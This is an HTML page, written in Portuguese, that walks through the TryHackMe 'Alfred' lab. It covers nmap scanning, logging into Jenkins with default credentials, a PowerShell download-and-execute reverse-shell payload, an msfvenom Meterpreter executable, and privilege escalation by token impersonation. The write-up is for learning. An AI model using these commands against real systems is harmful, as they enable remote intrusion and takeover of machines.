@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Relatório de Lab - Alfred</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-[#0D1121] via-[#1a2238] to-[#283655] text-white font-sans min-h-screen relative">
+  <!-- Background image decorative -->
+  <div class="pointer-events-none fixed inset-0 z-0 flex justify-center items-center">
+    <img src="https://image.lexica.art/full_webp/6957307a-3542-4118-ae89-54a02851ef3d" alt="background" class="opacity-30 w-full h-auto hidden md:block" />
+  </div>
+  <div class="relative z-10 max-w-5xl mx-auto py-12 px-2 md:px-10">
+    <!-- Cabeçalho -->
+    <header class="mb-10">
+      <div class="bg-gradient-to-r from-blue-900 to-blue-600 rounded-xl shadow-lg p-8 flex flex-col items-center">
+        <h1 class="text-4xl md:text-5xl font-extrabold uppercase tracking-widest text-white drop-shadow-lg mb-2">Alfred</h1>
+        <p class="text-green-100 text-lg">Relatório de Lab <a href="https://tryhackme.com/room/alfred" class="text-green-600 hover:underline" target="_blank">Alfred</a></p>
+        <p class="mt-2 text-sm text-green-50">Data: <span class="font-semibold">Maio de 2025</span></p>
+      </div>
+    </header>
+
+    <!-- Sumário -->
+    <nav class="mb-12">
+      <div class="bg-white rounded-xl shadow p-6 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-4">Sumário</h2>
+        <ul class="space-y-2 text-lg list-disc list-inside">
+          <li><a href="#introducao" class="text-blue-400 hover:underline">Introdução</a></li>
+          <li><a href="#cenario" class="text-blue-400 hover:underline">Cenário do Lab</a></li>
+          <li><a href="#enumeracao" class="text-blue-400 hover:underline">Enumeração Inicial</a></li>
+          <li><a href="#jenkins" class="text-blue-400 hover:underline">Acesso ao Jenkins</a></li>
+          <li><a href="#execucao" class="text-blue-400 hover:underline">Execução Remota de Comandos</a></li>
+          <li><a href="#shell" class="text-blue-400 hover:underline">Obtenção de Shell</a></li>
+          <li><a href="#switching" class="text-blue-400 hover:underline">Switching Shells</a></li>
+          <li><a href="#escalonamento" class="text-blue-400 hover:underline">Escalonamento de Privilégios</a></li>
+          <li><a href="#conclusao" class="text-blue-400 hover:underline">Conclusão e Aprendizados</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <!-- Introdução -->
+    <section class="mb-12" id="introducao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Introdução
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          O laboratório <strong>Alfred</strong> do TryHackMe simula um ambiente Windows corporativo com Jenkins exposto, permitindo a prática de técnicas de enumeração, exploração de execução remota de comandos, obtenção de shell reverso, troca de shells e escalonamento de privilégios. O objetivo é obter acesso administrativo e capturar as flags do usuário e do sistema.
+        </p>
+      </div>
+    </section>
+
+    <!-- Cenário do Lab -->
+    <section class="mb-12" id="cenario">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Cenário do Lab
+        </h2>
+        <ul class="list-disc pl-6 text-gray-800 text-lg space-y-2">
+          <li>Ambiente Windows com Jenkins exposto na rede.</li>
+          <li>Exploração de execução remota de comandos via interface Jenkins.</li>
+          <li>Obtenção de shell reverso e troca para Meterpreter.</li>
+          <li>Escalonamento de privilégios utilizando tokens e migração de processos.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Enumeração Inicial -->
+    <section class="mb-12" id="enumeracao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Enumeração Inicial
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          O primeiro passo foi realizar uma varredura de portas e serviços utilizando o <strong>nmap</strong>:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">nmap -v -Pn -sV MACHINE_IP</pre>
+        <img src="../images/images-alfred/image.png" alt="Nmap scan" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Ao acessar a página web padrão encontramos o texto: “RIP Bruce Wayne Donations to alfred@wayneenterprises.com are greatly appreciated.”
+        </p>
+        <img src="../images/images-alfred/image 1.png" alt="Página inicial" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Explorando outras portas, identificamos o Jenkins rodando na porta 8080.
+        </p>
+        <img src="../images/images-alfred/image 2.png" alt="Jenkins login" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Acesso ao Jenkins -->
+    <section class="mb-12" id="jenkins">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Acesso ao Jenkins
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Com uma simples "tentativa e erro" é possível acessar o Jenkins utilizando credenciais simples (usuário e senha padrão).
+        </p>
+        <img src="../images/images-alfred/image 3.png" alt="Login Jenkins" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+            Verifiquei  o histórico e os conteúdos do projeto, mas não havia nada.
+        </p>
+        <img src="../images/images-alfred/image 4.png" alt="Histórico Jenkins" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-alfred/image 5.png" alt="Conteúdo Jenkins" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Explorando a opção <strong>Configure</strong> de um projeto, encontramos algo interessante, uma funcionalidade que parece permitir que comandos sejam executados.
+        </p>
+        <img src="../images/images-alfred/image 6.png" alt="Configure Jenkins" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Execução Remota de Comandos -->
+    <section class="mb-12" id="execucao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Execução Remota de Comandos
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para obter uma shell reversa, preparamos o ambiente local com um servidor HTTP e um listener netcat:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+python3 -m http.server
+        </pre>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+nc -lvnp 4545
+        </pre>
+        <img src="../images/images-alfred/image 7.png" alt="HTTP server" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-alfred/image 8.png" alt="nc listener" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          No campo de execução de comandos do Jenkins, inserimos um payload PowerShell para baixar e executar um script de shell reverso:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+powershell iex (New-Object Net.WebClient).DownloadString('http://SEU_IP:PORTA/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress SEU_IP -Port PORTA
+        </pre>
+        <img src="../images/images-alfred/image 9.png" alt="Payload powershell" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Após configurar o comando, clicamos em <strong>Build Now</strong> para executar o payload.
+        </p>
+        <img src="../images/images-alfred/image 10.png" alt="Build now" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          O servidor HTTP registra a requisição do arquivo PowerShell, confirmando a execução do payload.
+        </p>
+        <img src="../images/images-alfred/image 11.png" alt="HTTP server retorno" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Obtenção de Shell -->
+    <section class="mb-12" id="shell">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Obtenção de Shell
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Com o payload executado, recebemos uma shell reversa na máquina atacante.
+        </p>
+        <img src="../images/images-alfred/image 12.png" alt="Shell reversa" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Navegando até o Desktop do usuário <strong>bruce</strong>, encontramos a flag do usuário.
+        </p>
+        <img src="../images/images-alfred/image 13.png" alt="Flag usuário" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Switching Shells -->
+    <section class="mb-12" id="switching">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-green-700">
+        <h2 class="text-3xl font-bold text-green-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-green-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Switching Shells
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para obter um shell Meterpreter, geramos um payload com <strong>msfvenom</strong>:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=SEU_IP LPORT=PORTA -f exe -o shell.exe
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Em seguida, transferimos o payload para a máquina alvo usando PowerShell:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://SEU_IP:PORTA/shell.exe','shell.exe')"
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          No Kali, iniciamos o Metasploit e configuramos o handler:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST SEU_IP
+set LPORT PORTA
+run
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Na shell reversa, executamos o payload:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+Start-Process "shell.exe"
+        </pre>
+        <img src="../images/images-alfred/image 14.png" alt="Meterpreter" class="rounded-xl border border-green-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Escalonamento de Privilégios -->
+    <section class="mb-12" id="escalonamento">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
+        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Escalonamento de Privilégios
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para identificar privilégios, utilizamos:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+whoami /priv
+        </pre>
+        <img src="../images/images-alfred/image 15.png" alt="whoami /priv" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Carregamos o módulo <strong>incognito</strong> e listamos os tokens disponíveis:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+load incognito
+list_tokens -g
+        </pre>
+        <img src="../images/images-alfred/image 16.png" alt="list_tokens" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Encontrando o token <span class="font-mono bg-gray-100 px-1 rounded">BUILTIN\Administrators</span>, utilizamos:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+impersonate_token "BUILTIN\Administrators"
+        </pre>
+        <img src="../images/images-alfred/image 17.png" alt="impersonate_token" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Agora precisamos migrar para um processo do sistema:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+ps
+migrate PID
+        </pre>
+        <img src="../images/images-alfred/image 18.png" alt="ps" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-alfred/image 19.png" alt="migrate" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Por fim, acessamos o diretório <span class="font-mono bg-gray-100 px-1 rounded">C:\Windows\system32\config</span> para capturar a flag de root.
+        </p>
+        <img src="../images/images-alfred/image 20.png" alt="Flag root" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Conclusão e Aprendizados -->
+    <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700" id="conclusao">
+      <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+        <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+        Conclusão e Aprendizados
+      </h2>
+      <ul class="list-disc pl-6 space-y-2 text-lg">
+        <li class="text-gray-800">A enumeração de portas e serviços é fundamental para identificar vetores de ataque.</li>
+        <li class="text-gray-800">A exploração de Jenkins evidencia riscos de exposição desse tipo de ferramentas.</li>
+        <li class="text-gray-800">A execução remota de comandos pode ser explorada para obtenção de shells reversos.</li>
+        <li class="text-gray-800">A troca para Meterpreter e uso de tokens são técnicas essenciais para escalonamento de privilégios em ambientes Windows.</li>
+        <li class="text-gray-800">A prática reforça a importância de hardening em ambientes corporativos e monitoramento de permissões e serviços.</li>
+      </ul>
+      <p class="text-gray-800 mt-6 text-lg">
+        O lab Alfred é excelente para praticar conhecimentos em exploração de ambientes Windows e pós-exploração.
+      </p>
+    </div>
+
+    <!-- Botão de Voltar -->
+    <div class="text-center mt-12">
+      <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-3 px-8 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-lg">← Voltar aos Labs</a>
+    </div>
+  </div>
+</body>
+</html>
